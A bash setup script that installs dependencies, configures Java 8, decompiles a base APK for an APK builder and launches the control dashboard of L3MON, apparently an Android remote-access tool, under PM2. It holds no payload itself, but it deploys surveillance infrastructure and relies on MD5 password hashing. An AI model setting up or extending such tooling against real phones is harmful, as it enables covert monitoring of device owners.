#!/bin/bash

# L3MON One-Time Setup Script
# Developed for evrahimkhan

echo "🚀 Starting L3MON One-Time Setup..."

# 1. Update and Install Base Dependencies
echo "📦 Installing system dependencies..."
sudo apt update && sudo apt install -y wget curl git npm nodejs

# 2. Java 8 Check/Installation
echo "☕ Checking Java 8..."
if java -version 2>&1 | grep -q "1.8.0"; then
    echo "✅ Java 8 is already active."
else
    echo "⚠️ Java 8 not detected as default. Setting up..."
    # If the user has the tarball in a predictable place, we could use it, 
    # but for a general script, we'll try to install via apt if available 
    # or guide the user. Since I already set it up system-wide:
    if [ -d "/usr/lib/jvm/jdk1.8.0_202" ]; then
        sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_202/bin/java 100
        sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_202/bin/java
        sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_202/bin/javac 100
        sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_202/bin/javac
        echo "✅ Java 8 configured from /usr/lib/jvm/jdk1.8.0_202"
    else
        echo "❌ Java 8 not found in /usr/lib/jvm/jdk1.8.0_202."
        echo "Please install Java 8 (1.8.0) to ensure APK building works."
    fi
fi

# 3. Node.js Dependencies
echo "npm 🛠️ Installing Node.js dependencies..."
npm install
npm install socket.io@2.2.0 --save # Force correct version for this codebase

# 4. Decompile base.apk (required for APK builder - decompiled/ is gitignored)
echo "📦 Decompiling base.apk for APK builder..."
if [ -f "app/factory/base.apk" ] && [ -f "app/factory/apktool.jar" ]; then
    if [ ! -d "app/factory/decompiled/smali" ]; then
        java -jar app/factory/apktool.jar d app/factory/base.apk -o app/factory/decompiled -f
        echo "✅ base.apk decompiled."
    else
        echo "✅ Decompiled directory already exists."
    fi
else
    echo "⚠️ base.apk or apktool.jar not found — APK builder will auto-decompile on first build."
fi

# 4. Apply EJS Syntax Fixes (Critical for newer EJS versions)
echo "🛠️ Patching EJS templates for compatibility..."
find assets/views -name "*.ejs" -exec sed -i "s|<% include \([^'\" ]*\) %>|<%- include('\1') %>|g" {} +
echo "✅ EJS templates patched."

# 5. Database Initialization
if [ ! -f "maindb.json" ]; then
    echo "🗄️ Initializing database..."
    cp maindb.json.back maindb.json
    echo "⚠️ maindb.json created from backup. Please update it with your MD5 password."
else
    echo "✅ maindb.json already exists."
fi

# 6. PM2 Setup
echo "🚀 Setting up PM2..."
sudo npm install pm2 -g
pm2 delete L3MON 2>/dev/null || true
pm2 delete index 2>/dev/null || true
pm2 start index.js --name D3MONE
pm2 save

echo "------------------------------------------------"
echo "✅ Setup Complete!"
echo "Dashboard: http://127.0.0.1:22533"
echo "Manage with: pm2 status, pm2 logs, pm2 stop D3MONE"
echo "------------------------------------------------"
